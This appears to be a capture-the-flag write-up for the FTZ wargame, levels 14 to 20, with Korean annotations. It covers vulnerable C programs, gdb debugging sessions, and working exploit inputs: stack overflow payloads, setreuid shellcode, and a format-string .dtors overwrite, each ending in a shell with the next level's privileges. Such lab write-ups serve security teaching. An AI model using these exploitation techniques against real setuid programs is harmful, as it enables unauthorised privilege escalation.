+0xbffffa90  41 0a 00 42 0c 03 13 42 20 30 01 40 34 fb ff bf   A..B...B 0.@4...
+0xbffffaa0  d8 fa ff bf 30 b2 00 40 50 bd 02 42 8a 54 11 42   ....0..@P..B.T.B
+0xbffffab0  0c 03 13 42 20 30 01 40 ef be ad de e1 84 04 08   ...B 0.@........
+0xbffffac0  2c 98 04 08 3c 99 04 08 08 fb ff bf 99 74 01 42   ,...<........t.B
+0xbffffad0  01 00 00 00 34 fb ff bf 3c fb ff bf 6a 83 04 08   ....4...<...j...
+0xbffffae0  d0 87 04 08 00 00 00 00 08 fb ff bf 82 74 01 42   .............t.B
+0xbffffaf0  00 00 00 00                                       ....
+sh-2.05a$
+
+-- 거리 계산 : 40bytes
+
+[level14@ftz                    ]$ perl -e 'print "A"x40'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[level14@ftz                    ]$
+[level14@ftz                    ]$ (printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat) | ./attackme
+
+id
+uid=3095(level15) gid=3094(level14) groups=3094(level14)
+
+============================================================
+Problem :: level15
+============================================================
+
+[level15@ftz level15]$ cat hint
+
+#include <stdio.h>
+
+main()
+{ int crap;
+  int *check;
+  char buf[20];
+  fgets(buf,45,stdin);
+  if (*check==0xdeadbeef)
+   {
+     setreuid(3096,3096);
+     system("/bin/sh");
+   }
+}
+
+[level15@ftz level15]$
+
+============================================================
+
+-- vuln.c --
+
+#include <stdio.h>
+
+#include "dumpcode.h"
+
+main(int argc, char *argv[])
+{
+        int crap;
+        int *check;
+        int offset = 80;
+        char buf[20];
+
+        fgets(buf,45,stdin);
+
+        printf("crap : %x, *check : %x, buf : %x\n", &crap, &check, &buf);
+        if(argc == 2) offset = atoi(argv[1]);
+        dumpcode(buf, offset);
+
+        if (*check==0xdeadbeef) {
+                setreuid(3096,3096);
+                system("/bin/sh");
+        }
+}
+
+-- End of vuln.c --
+
+[level15@ftz                    ]$ (printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xdeAAAAAAAA\x9c\xfa\xff\xbf"; cat) | ./vuln 200
+crap : bffffaac, *check : bffffaa8, buf : bffffa80
+0xbffffa80  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
+0xbffffa90  41 41 41 41 41 41 41 41 41 41 41 41 ef be ad de   AAAAAAAAAAAA....
+0xbffffaa0  41 41 41 41 c8 00 00 00 9c fa ff bf 00 85 04 08   AAAA............
+0xbffffab0  f0 98 04 08 04 9a 04 08 f8 fa ff bf 99 74 01 42   .............t.B
+0xbffffac0  02 00 00 00 24 fb ff bf 30 fb ff bf 8e 83 04 08   ....$...0.......
+0xbffffad0  40 88 04 08 00 00 00 00 f8 fa ff bf 82 74 01 42   @............t.B
+0xbffffae0  00 00 00 00 30 fb ff bf bc e5 12 42 c0 34 01 40   ....0......B.4.@
+0xbffffaf0  02 00 00 00 30 84 04 08 00 00 00 00 51 84 04 08   ....0.......Q...
+0xbffffb00  54 87 04 08 02 00 00 00 24 fb ff bf 78 83 04 08   T.......$...x...
+0xbffffb10  40 88 04 08 94 b9 00 40 1c fb ff bf 00 00 00 00   @......@........
+0xbffffb20  02 00 00 00 18 fc ff bf 1f fc ff bf 00 00 00 00   ................
+0xbffffb30  23 fc ff bf 4d fc ff bf 67 fc ff bf 85 fc ff bf   #...M...g.......
+0xbffffb40  a0 fc ff bf c2 fc ff bf                           ........
+
+id
+uid=3095(level15) gid=3095(level15) groups=3095(level15)
+exit
+
+[level15@ftz                    ]$  (printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xdeAAAAAAAA\x9c\xfa\xff\xbf"; cat) | ./attackme
+id
+uid=3096(level16) gid=3095(level15) groups=3095(level15)
+
+============================================================
+Problem :: level16
+============================================================
+
+[level16@ftz level16]$ cat hint
+
+
+#include <stdio.h>
+
+void shell() {
+  setreuid(3097,3097);
+  system("/bin/sh");
+}
+
+void printit() {
+  printf("Hello there!\n");
+}
+
+main()
+{ int crap;
+  void (*call)()=printit;
+  char buf[20];
+  fgets(buf,25,stdin);
+  call();
+}
+
+[level16@ftz level16]$
+
+============================================================
+
+[level16@ftz            ]$ ln -sf /home/level16/attackme attackme
+[level16@ftz            ]$ gdb ./attackme
+GNU gdb Red Hat Linux (5.1.90CVS-5)
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...(no debugging symbols found)...
+(gdb) disas main
+Dump of assembler code for function main:
+0x80484c0 <main>:       push   %ebp
+0x80484c1 <main+1>:     mov    %esp,%ebp
+0x80484c3 <main+3>:     sub    $0x1c,%esp
+0x80484c6 <main+6>:     push   %ebx
+0x80484c7 <main+7>:     movl   $0x80484ac,0xfffffff8(%ebp)
+0x80484ce <main+14>:    mov    0x8049644,%eax
+0x80484d3 <main+19>:    push   %eax
+0x80484d4 <main+20>:    push   $0x19
+0x80484d6 <main+22>:    lea    0xffffffe4(%ebp),%eax
+0x80484d9 <main+25>:    push   %eax
+0x80484da <main+26>:    call   0x804839c <fgets>
+0x80484df <main+31>:    add    $0xc,%esp
+0x80484e2 <main+34>:    mov    0xfffffff8(%ebp),%ebx
+0x80484e5 <main+37>:    call   *%ebx
+0x80484e7 <main+39>:    mov    0xffffffe0(%ebp),%ebx
+0x80484ea <main+42>:    leave
+0x80484eb <main+43>:    ret
+0x80484ec <main+44>:    nop
+0x80484ed <main+45>:    nop
+0x80484ee <main+46>:    nop
+0x80484ef <main+47>:    nop
+End of assembler dump.
+(gdb) b *main+37
+Breakpoint 1 at 0x80484e5
+(gdb) r
+Starting program: /home/level16/attackme
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (36)
+(no debugging symbols found)...(no debugging symbols found)...
+Breakpoint 1, 0x080484e5 in main ()
+(gdb) info reg ebx
+ebx            0x41414141       1094795585
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/level16/attackme
+AAAAAAAAAAAAAAAAAAAAAAA (23)
+(no debugging symbols found)...(no debugging symbols found)...
+Breakpoint 1, 0x080484e5 in main ()
+(gdb) info reg ebx
+ebx            0xa414141        172048705
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0a414141 in ?? ()
+(gdb) info func shell
+All functions matching regular expression "shell":
+
+Non-debugging symbols:
+0x08048488  shell
+0x420e36a4  initshells
+0x420e38b0  getusershell
+0x420e38f0  endusershell
+0x420e3950  setusershell
+(gdb) q
+The program is running.  Exit anyway? (y or n) yu
+[level16@ftz            ]$ perl -e 'print "A"x20'
+AAAAAAAAAAAAAAAAAAAA[level16@ftz            ]$
+[level16@ftz            ]$ (printf "AAAAAAAAAAAAAAAAAAAA\x88\x84\x04\x08"; cat) | ./attackme
+
+id
+uid=3097(level17) gid=3096(level16) groups=3096(level16)
+
+============================================================
+Problem :: level17
+============================================================
+
+[level17@ftz level17]$ cat hint
+
+#include <stdio.h>
+
+void printit() {
+  printf("Hello there!\n");
+}
+
+main()
+{ int crap;
+  void (*call)()=printit;
+  char buf[20];
+  fgets(buf,45,stdin);
+  setreuid(3098,3098);
+  call();
+}
+
+[level17@ftz level17]$
+
+============================================================
+[level17@ftz                  ]$ ln -sf /home/level17/attackme .
+[level17@ftz                  ]$ perl -e 'print "A"x46' | ./attackme
+Segmentation fault
+[level17@ftz                  ]$ perl -e 'print "A"x42' | ./attackme
+Segmentation fault
+[level17@ftz                  ]$ perl -e 'print "A"x38' | ./attackme
+Hello there!
+[level17@ftz                  ]$ gdb ./attackme
+GNU gdb Red Hat Linux (5.1.90CVS-5)
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) disas main
+Dump of assembler code for function main:
+0x80484a8 <main>:       push   %ebp
+0x80484a9 <main+1>:     mov    %esp,%ebp
+0x80484ab <main+3>:     sub    $0x38,%esp
+0x80484ae <main+6>:     movl   $0x8048490,0xfffffff0(%ebp)
+0x80484b5 <main+13>:    sub    $0x4,%esp
+0x80484b8 <main+16>:    pushl  0x804967c
+0x80484be <main+22>:    push   $0x2d
+0x80484c0 <main+24>:    lea    0xffffffc8(%ebp),%eax
+0x80484c3 <main+27>:    push   %eax
+0x80484c4 <main+28>:    call   0x8048350 <fgets>
+0x80484c9 <main+33>:    add    $0x10,%esp
+0x80484cc <main+36>:    sub    $0x8,%esp
+0x80484cf <main+39>:    push   $0xc1a
+0x80484d4 <main+44>:    push   $0xc1a
+0x80484d9 <main+49>:    call   0x8048380 <setreuid>
+0x80484de <main+54>:    add    $0x10,%esp
+0x80484e1 <main+57>:    mov    0xfffffff0(%ebp),%eax
+0x80484e4 <main+60>:    call   *%eax
+0x80484e6 <main+62>:    leave
+0x80484e7 <main+63>:    ret
+0x80484e8 <main+64>:    nop
+0x80484e9 <main+65>:    nop
+0x80484ea <main+66>:    nop
+0x80484eb <main+67>:    nop
+0x80484ec <main+68>:    nop
+0x80484ed <main+69>:    nop
+0x80484ee <main+70>:    nop
+0x80484ef <main+71>:    nop
+End of assembler dump.
+(gdb) b *main+60
+Breakpoint 1 at 0x80484e4
+(gdb) r
+Starting program: /home/level17/attackme
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (42)
+
+Breakpoint 1, 0x080484e4 in main ()
+(gdb) info reg eax
+eax            0xa4141  672065
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+[level17@ftz                  ]$ cc -o egg egg.c
+egg.c: In function `main':
+egg.c:20: warning: return type of `main' is not `int'
+[level17@ftz                  ]$ ./egg
+Using address: 0xbffffa98
+[level17@ftz                  ]$ perl -e 'print "A"x40'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[level17@ftz                  ]$
+[level17@ftz                  ]$ (printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x98\xfa\xff\xbf"; cat) | ./attackme
+
+id
+uid=3098(level18) gid=3097(level17) groups=3097(level17)
+
+============================================================
+Problem :: level18
+============================================================
+
+[level18@ftz level18]$ cat hint
+
+#include <stdio.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <unistd.h>
+void shellout(void);
+int main()
+{
+  char string[100];
+  int check;
+  int x = 0;
+  int count = 0;
+  fd_set fds;
+  printf("Enter your command: ");
+  fflush(stdout);
+  while(1)
+    {
+      if(count >= 100)
+        printf("what are you trying to do?\n");
+      if(check == 0xdeadbeef)
+        shellout();
+      else
+        {
+          FD_ZERO(&fds);
+          FD_SET(STDIN_FILENO,&fds);
+
+          if(select(FD_SETSIZE, &fds, NULL, NULL, NULL) >= 1)
+            {
+              if(FD_ISSET(fileno(stdin),&fds))
+                {
+                  read(fileno(stdin),&x,1);
+                  switch(x)
+                    {
+                      case '\r':
+                      case '\n':
+                        printf("\a");
+                        break;
+                      case 0x08:
+                        count--;
+                        printf("\b \b");
+                        break;
+                      default:
+                        string[count] = x;
+                        count++;
+                        break;
+                    }
+                }
+            }
+        }
+    }
+}
+
+void shellout(void)
+{
+  setreuid(3099,3099);
+  execl("/bin/sh","sh",NULL);
+}
+
+[level18@ftz level18]$
+
+============================================================
+
+...
+	case 0x08:
+		count--;
+		printf("\b \b");
+	break;
+...
+
+문자열의 16진수로 0x08 일 경우 전체 array index 를 1 씩 감소하는 조건.
+[level18@ftz                 ]$ gdb ./attackme
+GNU gdb Red Hat Linux (5.1.90CVS-5)
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(no debugging symbols found)...
+(gdb) disas main
+...
+0x80485ab <main+91>:    cmpl   $0xdeadbeef,0xffffff98(%ebp)
+0x80485b2 <main+98>:    jne    0x80485c0 <main+112>
+0x80485b4 <main+100>:   call   0x8048780 <shellout>
+...
+(gdb) b *main+91
+Breakpoint 1 at 0x80485ab
+(gdb) r
+Starting program: /home/level18/attackme
+Enter your command: (no debugging symbols found)...(no debugging symbols found)...
+Breakpoint 1, 0x080485ab in main ()
+(gdb) c
+Continuing.
+in
+
+Breakpoint 1, 0x080485ab in main ()
+(gdb) ndra
+Undefined command: "n".  Try "help".
+(gdb) x/12bx $ebp+0xffffff98
+0xbffffa60:     0x0c    0x03    0x13    0x42    0x69    0x03    0x13    0x42
+0xbffffa68:     0xc0    0x34    0x01    0x40
+(gdb) shell
+[level18@ftz                 ]$ perl -e 'print "\x69\n"'
+i
+[level18@ftz                 ]$ exit
+exit
+(gdb) c
+Continuing.
+nd
+
+Breakpoint 1, 0x080485ab in main ()
+(gdb) d
+Delete all breakpoints? (y or n) n
+(gdb) x/12bx $ebp+0xffffff98
+0xbffffa60:     0x0c    0x03    0x13    0x42    0x69    0x6e    0x13    0x42
+0xbffffa68:     0xc0    0x34    0x01    0x40
+(gdb) shell
+[level18@ftz                 ]$ perl -e 'print "\x6e\n"'
+n
+[level18@ftz                 ]$ exit
+exit
+(gdb)
+
+--
+
+[int check]+[char string(100)] 의 형식임을 확인.
+
+[level18@ftz                 ]$ (printf "\x08\x08\x08\x08\xef\xbe\xad\xde"; cat)| ./attackme
+Enter your command:
+id
+uid=3099(level19) gid=3098(level18) groups=3098(level18)
+
+============================================================
+Problem :: level19
+============================================================
+
+[level19@ftz level19]$ cat hint
+
+
+main()
+{ char buf[20];
+  setreuid(3020,3020);
+  gets(buf);
+  printf("%s\n",buf);
+}
+
+[level19@ftz level19]$
+
+============================================================
+
+[level19@ftz              ]$ ln -sf /home/level19/attackme .
+[level19@ftz              ]$ gdb ./attackme
+GNU gdb Red Hat Linux (5.1.90CVS-5)
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(no debugging symbols found)...
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048438 <main>:       push   %ebp
+0x8048439 <main+1>:     mov    %esp,%ebp
+0x804843b <main+3>:     sub    $0x14,%esp
+0x804843e <main+6>:     push   $0xbcc
+0x8048443 <main+11>:    push   $0xbcc
+0x8048448 <main+16>:    call   0x8048374 <setreuid>
+0x804844d <main+21>:    add    $0x8,%esp
+0x8048450 <main+24>:    lea    0xffffffec(%ebp),%eax
+0x8048453 <main+27>:    push   %eax
+0x8048454 <main+28>:    call   0x8048334 <gets>
+...
+(gdb) b *main+45
+Breakpoint 1 at 0x8048465
+(gdb) r
+Starting program: /home/level19/attackme
+AAAAAAAAAAAAAAAAAAAAAABB
+(no debugging symbols found)...(no debugging symbols found)...
+Breakpoint 1, 0x08048465 in main ()
+(gdb) x/4bx $ebp
+0xbffffac8:     0x41    0x41    0x42    0x42
+(gdb)
+
+[char string(20)] + [ebp] + [ret (eip)]
+
+	/* setreuid(3100, 3100); */
+        "\x31\xc9"              /* xor    %ecx,%ecx */
+        "\x66\xb9\x1c\x0c"      /* mov    $0xc1c,%cx */
+        "\x31\xdb"              /* xor    %ebx,%ebx */
+        "\x66\xbb\x1c\x0c"      /* mov    $0xc1c,%bx */
+        "\x31\xc0"              /* xor    %eax,%eax */
+        "\xb0\x46"              /* mov    $0x46,%al */
+        "\xcd\x80"              /* int    $0x80 */
+
+[level19@ftz              ]$ cc -o egg egg.c
+egg.c: In function `main':
+egg.c:26: warning: return type of `main' is not `int'
+[level19@ftz              ]$ ./egg
+Using address: 0xbffffaa8
+[level19@ftz              ]$ perl -e 'print "A"x24'
+AAAAAAAAAAAAAAAAAAAAAAAA[level19@ftz              ]$
+[level19@ftz              ]$ (printf "AAAAAAAAAAAAAAAAAAAAAAAA\xa8\xfa\xff\xbf"; cat)|./attackme
+
+AAAAAAAAAAAAAAAAAAAAAAAA¾?id
+uid=3100(level20) gid=3099(level19) groups=3099(level19)
+
+============================================================
+Problem :: level20
+============================================================
+
+[level20@ftz level20]$ cat hint
+
+#include <stdio.h>
+main(int argc,char **argv)
+{ char bleh[80];
+  setreuid(3101,3101);
+  fgets(bleh,79,stdin);
+  printf(bleh);
+}
+
+[level20@ftz level20]$
+
+============================================================
+
+	/* clear setreuid() */
+        "\x31\xc9"              /* xor    %ecx,%ecx */
+        "\x66\xb9\x1d\x0c"      /* mov    $0xc1d,%cx */
+        "\x31\xdb"              /* xor    %ebx,%ebx */
+        "\x66\xbb\x1d\x0c"      /* mov    $0xc1d,%bx */
+        "\x31\xc0"              /* xor    %eax,%eax */
+        "\xb0\x46"              /* mov    $0x46,%al */
+        "\xcd\x80"              /* int    $0x80 */
+
+[level20@ftz            ]$ cc -o egg egg.c
+egg.c: In function `main':
+egg.c:28: warning: return type of `main' is not `int'
+[level20@ftz            ]$ ./egg
+Using address: 0xbffffaa8
+[level20@ftz            ]$ objdump -h attackme | grep dtors
+ 18 .dtors        00000008  08049508  08049508  00000508  2**2
+[level20@ftz            ]$ 
+
+ret = 0x804950c ( 0x8049508 + 0x4 )
+
+[level20@ftz            ]$ ./attackme
+AAAA %8x %8x %8x %8x %8x
+AAAA 41414141 78382520 78382520 78382520 78382520
+[level20@ftz            ]$ 
+
+%8x 필요치 않음.
+
+(faa8)64168 - 16 = 64152
+(1bfff)114687 - (faa8)64168 = 50519
+
+[level20@ftz            ]$ (printf "AAAA\x0c\x95\x04\x08AAAA\x0e\x95\x04\x08%%64152c%%n%%50519c%%n"; cat) | ./attackme
+..........
+id
+uid=3101(clear) gid=3100(level20) groups=3100(level20)
+
